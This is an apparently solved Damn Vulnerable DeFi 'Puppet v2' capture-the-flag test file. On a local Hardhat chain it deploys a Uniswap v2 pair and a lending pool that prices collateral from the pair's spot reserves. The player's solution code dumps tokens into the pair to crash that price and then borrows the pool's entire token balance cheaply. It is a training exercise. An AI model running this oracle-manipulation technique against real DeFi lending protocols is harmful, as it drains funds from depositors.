const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Puppet v2', function () {
    let deployer, player;
    let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
    const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);

        // Deploy tokens to be traded
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        uniswapRouter = await UniswapRouterFactory.deploy(
            uniswapFactory.address,
            weth.address
        );

        // Create Uniswap pair against WETH and add liquidity
        await token.approve(
            uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapRouter.addLiquidityETH(
            token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // DEADLINE
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        uniswapExchange = await UniswapPairFactory.attach(
            await uniswapFactory.getPair(token.address, weth.address)
        );
        expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);

        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            weth.address,
            token.address,
            uniswapExchange.address,
            uniswapFactory.address
        );

        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Check pool's been correctly setup
        expect(
            await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)
        ).to.eq(3n * 10n ** 17n);
        expect(
            await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.eq(300000n * 10n ** 18n);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // deposit required to borrow lending pool tokens at the beginning
        let DEPOSIT_REQUIRED_BEFORE_SWAP = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE); // 300.000.000.000.000.000.000.000
        console.log("DEPOSIT REQUIRED BEFORE SWAP: ", DEPOSIT_REQUIRED_BEFORE_SWAP);
        const DEADLINE = (await ethers.provider.getBlock('latest')).timestamp * 2;


        /* SOLUTION 1: DOUBLE SWAP AND BORROW  */
        /* let playerBalance = await ethers.provider.getBalance(player.address);
        // swap player ETH for DVT
        await uniswapRouter.connect(player).swapExactETHForTokens(
            0,
            [weth.address, token.address],
            player.address,
            DEADLINE,
            { value: playerBalance.sub(ethers.utils.parseEther('0.1')) }
        );

        // swap all DVTs for WETH
        let playerTokenBalance = await token.balanceOf(player.address)
        await token.connect(player).approve(uniswapRouter.address, playerTokenBalance)
        await uniswapRouter.connect(player).swapExactTokensForTokens(
            playerTokenBalance,
            0,
            [token.address, weth.address],
            player.address,
            DEADLINE
        );
        // deposit required to borrow lending pool tokens after swapping DVTs for ETH
        let DEPOSIT_REQUIRED_AFTER_SWAP = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE); // 29.496.494.833.197.321.980
        console.log("DEPOSIT REQUIRED AFTER SWAP: ", DEPOSIT_REQUIRED_AFTER_SWAP); */
        /* END SOLUTION 1 */


        /* SOLUTION 2: SWAP, WRAP AND BORROW  */
        const PATH = [token.address, weth.address];

        // swap DVTs for ETH in order to lower the price
        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
        let tx = await uniswapRouter.connect(player).swapExactTokensForETH(
            PLAYER_INITIAL_TOKEN_BALANCE,
            0,
            PATH,
            player.address,
            DEADLINE
        );
        await tx.wait();

        // deposit required to borrow lending pool tokens after swapping DVTs for ETH
        const DEPOSIT_REQUIRED_AFTER_SWAP = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE); // 29.496.494.833.197.321.980
        console.log("DEPOSIT REQUIRED AFTER SWAP: ", DEPOSIT_REQUIRED_AFTER_SWAP);
        // wrap required amount of ETH
        await weth.connect(player).deposit({ value: DEPOSIT_REQUIRED_AFTER_SWAP });
        /* END SOLUTION 1 */


        // call lendingPool borrow function to drain the funds
        await weth.connect(player).approve(lendingPool.address, DEPOSIT_REQUIRED_AFTER_SWAP);
        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player has taken all tokens from the pool        
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0);

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});